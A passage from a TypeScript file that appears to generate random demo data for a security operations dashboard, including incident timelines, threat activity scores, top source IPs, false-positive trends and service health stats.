      technique: t,
      name: n,
      count: 4 + Math.floor(rng() * 40),
    })),
    incidentTimeline: Array.from({ length: 14 }, (_, d) => ({
      day: new Date(base - (13 - d) * 86400000).toISOString().slice(5, 10),
      opened: 2 + Math.floor(rng() * 9),
      resolved: 1 + Math.floor(rng() * 8),
    })),
    threatActivity: Array.from({ length: 24 }, (_, h) => ({
      time: `${h.toString().padStart(2, "0")}:00`,
      score: 30 + Math.floor(rng() * 60),
      blocked: 10 + Math.floor(rng() * 90),
    })),
    topAssets: HOSTS.slice(0, 7).map((h) => ({ asset: h, alerts: 3 + Math.floor(rng() * 30) })),
    topSourceIps: Array.from({ length: 7 }, () => ({
      ip: ip(rng),
      count: 5 + Math.floor(rng() * 60),
      country: pick(rng, COUNTRIES),
    })),
    fpTrend: Array.from({ length: 14 }, (_, d) => ({
      day: new Date(base - (13 - d) * 86400000).toISOString().slice(5, 10),
      rate: 6 + Math.round(rng() * 140) / 10,
    })),
  };

  const adminStats: AdminStats = {
    totalUsers: users.length,
    activeUsers: users.filter((u) => u.status === "active").length,
    pendingApprovals: users.filter((u) => u.status === "pending").length,
    failedLogins24h: 27,
    securityEvents24h: 412,
    services: [
      { name: "API Gateway", status: "healthy", latencyMs: 42, uptime: 99.98 },
      { name: "Ingestion Pipeline", status: "degraded", latencyMs: 820, uptime: 99.41 },
      { name: "Detection Engine", status: "healthy", latencyMs: 118, uptime: 99.95 },
      { name: "PostgreSQL Cluster", status: "healthy", latencyMs: 9, uptime: 99.99 },
      { name: "WebSocket Hub", status: "healthy", latencyMs: 31, uptime: 99.97 },
      { name: "Threat Intel Sync", status: "healthy", latencyMs: 240, uptime: 99.8 },
    ],
  };

  return {
    generatedAt: new Date(base).toISOString(),
    users,
    sessions,
    alerts,
    incidents,
    cases,
    iocs,
    feeds,
    actors,
    assets,
    rules,
    hunts,
    huntResults,
    notifications,
    auditLogs,
    reports,
    metrics,
    adminStats,
  };
}

export const DEMO_CONSTANTS = { ANALYSTS, HOSTS, MITRE, RULES, SEVERITIES };
